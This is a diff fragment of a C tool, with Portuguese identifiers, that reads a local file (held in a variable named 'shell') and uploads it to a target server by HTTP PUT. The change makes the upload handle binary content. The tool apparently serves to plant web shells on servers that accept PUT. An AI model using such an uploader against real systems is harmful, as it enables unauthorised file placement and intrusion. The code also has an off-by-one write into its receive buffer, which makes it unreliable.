@@ -41,10 +41,9 @@ static int error(char *err){
 	exit(EXIT_FAILURE);
 }
 
-char *file_content(char * file_location){
-	int size;
+char *file_content(char * file_location, size_t *size){
 	FILE *shell;
-	char *buffer;
+	unsigned char *buffer;
 	shell = fopen(file_location,"r");
 	if(shell == NULL)
 		error(file_location);
@@ -77,8 +76,8 @@ static char* substring(char *ch, int pos, int length)
 
 static int request(char *target, char *file, char *create, char *path, char **response)
 {
-	char *conteudo = file_content(file);
-	int size = strlen(conteudo);
+	size_t size;
+	unsigned char *conteudo = file_content(file, &size);
 	int msocket,recebidos;
 	char resposta[5000];
 	struct sockaddr_in addr;
@@ -104,10 +103,14 @@ static int request(char *target, char *file, char *create, char *path, char **re
 
 	char *put = malloc(1024);
 
-	sprintf(put,"PUT %s%s HTTP/1.1\r\nContent-Length: %d\r\nHost: %s\r\nConnection: close\r\n\r\n%s\r\n\r\n\r\n",path,create,size,target,conteudo);
+	sprintf(put,"PUT %s%s HTTP/1.1\r\nContent-Length: %d\r\nHost: %s\r\nConnection: close\r\n\r\n",path,create,size,target);
 
-	if(send(msocket,put,strlen(put),0) < 0)
-		error("\033[1;31m[-]\033[0m fail to make request");
+	if (send(msocket,put,strlen(put),0) < 0) {
+		error("Fail to send header");
+	}
+	if (send(msocket,(void *)conteudo, size, 0) < 0) {
+		error("Fail to send content");
+	}
 
 	while((recebidos = recv(msocket,resposta,5000,0))){
 		resposta[recebidos] = '\0';
